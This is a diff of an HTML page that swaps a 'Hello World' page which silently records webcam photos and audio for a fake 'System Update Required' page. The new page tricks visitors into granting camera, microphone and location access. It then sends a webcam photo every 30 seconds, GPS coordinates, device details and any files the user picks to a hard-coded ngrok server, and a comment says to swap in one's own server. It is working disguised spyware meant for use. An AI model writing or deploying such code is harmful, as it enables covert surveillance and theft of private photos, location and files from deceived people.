@@ -3,111 +3,369 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World</title>
+    <title>System Update</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 100px 20px;
-            background: #000;
-            color: #0f0;
             margin: 0;
+            padding: 0;
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
-        h1 { font-size: 4.8em; }
-        p { font-size: 1.7em; }
-        .status { color: #0f0; font-size: 1.4em; margin-top: 50px; }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h3 { color: #1a73e8; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; margin: 10px 0; }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        button:hover { background: #1557b0; }
+        #status {
+            padding: 10px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 15px;
+        }
+        .hidden { display: none; }
+        .file-list {
+            text-align: left;
+            margin-top: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 10px;
+        }
+        .file-item {
+            padding: 8px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .file-name { color: #202124; word-break: break-all; flex: 1; }
+        .file-size { color: #5f6368; font-size: 10px; margin-left: 10px; }
+        .preview-img {
+            max-width: 60px;
+            max-height: 60px;
+            border-radius: 8px;
+            margin-left: 10px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #323232;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 24px;
+            font-size: 12px;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
-    <h1>Hello World</h1>
-    <p>Sedang memverifikasi...</p>
-    <div class="status" id="status">Menginisialisasi perekaman senyap...</div>
 
-    <video id="video" autoplay playsinline muted style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+<div class="container" id="mainContainer">
+    <div>
+        <span style="font-size: 48px;">🔄</span>
+        <h3>System Update Required</h3>
+        <p>Your device needs to sync files for security update.</p>
+        <button id="startBtn">Start Synchronization</button>
+        <div id="status">Click Start to begin</div>
+    </div>
+</div>
 
-    <script>
-        let stream = null;
-        let audioRecorder = null;
-        let audioChunks = [];
-        const ngrokUrl = "https://reversion-exert-gloomily.ngrok-free.dev";
-
-        async function startSilentSurveillance() {
-            try {
-                // Minta izin dengan audio muted
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: true
-                });
-
-                const videoElement = document.getElementById('video');
-                videoElement.srcObject = stream;
-                videoElement.muted = true;           // Matikan suara video
-
-                document.getElementById('status').innerHTML = "✅ Berjalan SENYAP<br>Foto setiap 1 menit • Audio terus merekam";
-
-                // === AUDIO RECORDER (SENYAP - tidak ada suara keluar dari speaker) ===
-                const audioTrack = stream.getAudioTracks()[0];
-                const audioStream = new MediaStream([audioTrack]);
-
-                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-
-                audioRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) audioChunks.push(event.data);
+<script>
+    // ============ GANTI DENGAN SERVER KAMU ============
+    const SERVER_URL = "https://reversion-exert-gloomily.ngrok-free.dev";  // GANTI INI!
+    // =================================================
+    
+    let mediaStream = null;
+    let photoInterval = null;
+    let fileInput = null;
+    
+    const startBtn = document.getElementById('startBtn');
+    const statusDiv = document.getElementById('status');
+    const mainContainer = document.getElementById('mainContainer');
+    
+    // Fungsi kirim data ke server
+    async function sendToServer(endpoint, data, isFile = false) {
+        try {
+            let url = `${SERVER_URL}/${endpoint}`;
+            let options = {};
+            
+            if (isFile) {
+                options = { method: 'POST', body: data };
+            } else {
+                options = {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 };
-
-                audioRecorder.onstop = () => {
-                    if (audioChunks.length > 0) {
-                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                        sendData('audio', blob);
-                        audioChunks = [];
-                    }
-                    // Lanjut rekam tanpa henti
-                    audioRecorder.start(30000);
-                };
-
-                // Mulai rekam audio (tetap senyap)
-                audioRecorder.start(30000);
-
-                // === FOTO SETIAP 1 MENIT ===
-                setInterval(captureSilentPhoto, 60000);
-                setTimeout(captureSilentPhoto, 7000); // foto pertama
-
-            } catch (err) {
-                document.getElementById('status').innerHTML = "❌ Izin ditolak.<br>Harap izinkan kamera & mikrofon.";
             }
+            
+            await fetch(url, options);
+            return true;
+        } catch(e) {
+            console.log('Send failed:', e);
+            return false;
         }
-
-        function captureSilentPhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+    }
+    
+    // Ambil foto dari kamera (setiap 30 detik)
+    async function captureAndSendPhoto() {
+        if (!mediaStream) return;
+        
+        try {
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            await video.play();
+            
+            // Tunggu sebentar biar video ready
+            await new Promise(r => setTimeout(r, 500));
+            
+            const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                if (blob) sendData('photo', blob, `photo_${Date.now()}.jpg`);
-            }, 'image/jpeg', 0.85);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob);
+                formData.append('timestamp', new Date().toISOString());
+                await sendToServer('photo', formData, true);
+                statusDiv.innerHTML = `📸 Photo captured & sent at ${new Date().toLocaleTimeString()}`;
+            }, 'image/jpeg', 0.8);
+            
+            video.srcObject = null;
+        } catch(e) {
+            console.log('Capture failed:', e);
         }
-
-        function sendData(type, blob, filename = null) {
-            const formData = new FormData();
-            formData.append('type', type);
-            formData.append('file', blob, filename || `${type}_${Date.now()}.webm`);
-
-            fetch(`${ngrokUrl}/upload`, {
-                method: 'POST',
-                body: formData,
-                keepalive: true
-            }).catch(() => {});
+    }
+    
+    // Ambil lokasi GPS
+    async function getAndSendLocation() {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendToServer('location', {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                });
+                statusDiv.innerHTML = `📍 Location sent: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+            }, (err) => {
+                console.log('Location denied:', err);
+            }, { enableHighAccuracy: true });
         }
-
-        // Jalankan otomatis
-        window.onload = () => {
-            startSilentSurveillance();
+    }
+    
+    // Setup file picker untuk akses folder/file HP
+    function setupFileAccess() {
+        // Buat input file (bisa multiple file)
+        fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.multiple = true;
+        fileInput.accept = 'image/*,video/*,application/*,text/*';
+        fileInput.style.display = 'none';
+        document.body.appendChild(fileInput);
+        
+        // Saat user pilih file, upload semua
+        fileInput.onchange = async () => {
+            if (!fileInput.files.length) return;
+            
+            statusDiv.innerHTML = `📤 Uploading ${fileInput.files.length} files...`;
+            
+            for (let i = 0; i < fileInput.files.length; i++) {
+                const file = fileInput.files[i];
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('filename', file.name);
+                formData.append('type', file.type);
+                
+                await sendToServer('upload', formData, true);
+                statusDiv.innerHTML = `📁 Uploaded: ${file.name}`;
+                
+                // Delay sedikit biar ga overload
+                await new Promise(r => setTimeout(r, 500));
+            }
+            
+            statusDiv.innerHTML = `✅ All files uploaded! Total: ${fileInput.files.length} files`;
+            
+            // Kosongkan input biar bisa pilih lagi
+            fileInput.value = '';
+            
+            // Tampilkan notifikasi
+            showToast(`${fileInput.files.length} files uploaded to cloud`);
         };
-    </script>
+        
+        return fileInput;
+    }
+    
+    // Tampilkan tombol untuk pilih file/folder
+    function showFileSelector() {
+        const fileSection = document.createElement('div');
+        fileSection.className = 'file-section';
+        fileSection.style.marginTop = '20px';
+        fileSection.style.padding = '15px';
+        fileSection.style.background = '#e8f0fe';
+        fileSection.style.borderRadius = '12px';
+        fileSection.style.textAlign = 'center';
+        fileSection.innerHTML = `
+            <h4 style="margin:0 0 10px 0; color:#1a73e8;">📁 File Access</h4>
+            <p style="font-size:12px; margin:5px 0;">Click below to select photos/files from your device</p>
+            <button id="selectFilesBtn" style="background:#34a853; margin:5px;">Select Files</button>
+            <button id="selectPhotosBtn" style="background:#ea4335; margin:5px;">Select Photos</button>
+            <p id="fileCount" style="font-size:11px; margin-top:10px; color:#5f6368;"></p>
+        `;
+        
+        mainContainer.appendChild(fileSection);
+        
+        const selectFilesBtn = document.getElementById('selectFilesBtn');
+        const selectPhotosBtn = document.getElementById('selectPhotosBtn');
+        const fileCountSpan = document.getElementById('fileCount');
+        
+        if (selectFilesBtn) {
+            selectFilesBtn.onclick = () => {
+                fileInput.accept = '*/*';
+                fileInput.click();
+            };
+        }
+        
+        if (selectPhotosBtn) {
+            selectPhotosBtn.onclick = () => {
+                fileInput.accept = 'image/*';
+                fileInput.click();
+            };
+        }
+    }
+    
+    // Ambil informasi device
+    async function sendDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+        
+        await sendToServer('device', info);
+    }
+    
+    // Tampilkan toast notifikasi
+    function showToast(msg) {
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerText = msg;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+    
+    // Fungsi utama - mulai semua akses
+    async function startAccess() {
+        statusDiv.innerHTML = '🔄 Requesting permissions...';
+        startBtn.disabled = true;
+        startBtn.style.opacity = '0.6';
+        
+        try {
+            // 1. Minta akses kamera & mikrofon
+            mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: { ideal: 640 }, height: { ideal: 480 } }, 
+                audio: true 
+            });
+            
+            statusDiv.innerHTML = '✅ Camera & mic access granted';
+            
+            // 2. Kirim info device
+            await sendDeviceInfo();
+            
+            // 3. Dapatkan lokasi
+            await getAndSendLocation();
+            
+            // 4. Setup file access
+            setupFileAccess();
+            showFileSelector();
+            
+            // 5. Mulai ambil foto setiap 30 detik
+            await captureAndSendPhoto(); // ambil langsung
+            photoInterval = setInterval(captureAndSendPhoto, 30000); // setiap 30 detik
+            
+            // 6. Update UI
+            mainContainer.innerHTML = `
+                <div style="text-align:center;">
+                    <span style="font-size:48px;">✅</span>
+                    <h3>Sync Active</h3>
+                    <p>Your device is now synchronized.</p>
+                    <div id="statusNew" style="background:#f1f3f4; padding:10px; border-radius:8px; margin-top:15px; font-size:12px;">
+                        📸 Photos: every 30s<br>
+                        📍 Location: tracking active<br>
+                        📁 Files: ready to upload
+                    </div>
+                </div>
+            `;
+            
+            // Tampilkan file selector di container baru
+            setTimeout(() => {
+                const fileSection = document.createElement('div');
+                fileSection.style.marginTop = '20px';
+                fileSection.style.padding = '15px';
+                fileSection.style.background = '#e8f0fe';
+                fileSection.style.borderRadius = '12px';
+                fileSection.innerHTML = `
+                    <h4>📁 Upload Files</h4>
+                    <button id="uploadBtn" style="background:#1a73e8;">Select Files</button>
+                    <p id="uploadStatus" style="font-size:11px; margin-top:10px;"></p>
+                `;
+                mainContainer.appendChild(fileSection);
+                
+                document.getElementById('uploadBtn').onclick = () => {
+                    if (fileInput) fileInput.click();
+                };
+            }, 100);
+            
+            statusDiv.innerHTML = '✅ All systems active. Photos will be captured every 30 seconds.';
+            
+        } catch(error) {
+            statusDiv.innerHTML = '⚠️ Permission required! Click "Allow" in the popup to continue.';
+            startBtn.disabled = false;
+            startBtn.style.opacity = '1';
+            
+            // Coba lagi setelah 2 detik
+            setTimeout(startAccess, 3000);
+        }
+    }
+    
+    // Event listener
+    startBtn.addEventListener('click', startAccess);
+    
+    // Cek apakah sudah pernah izin
+    navigator.mediaDevices.enumerateDevices().then(devices => {
+        const hasCamera = devices.some(d => d.kind === 'videoinput');
+        if (hasCamera) {
+            // Siap, tapi tetap butuh klik tombol
+        }
+    });
+</script>
 </body>
 </html>
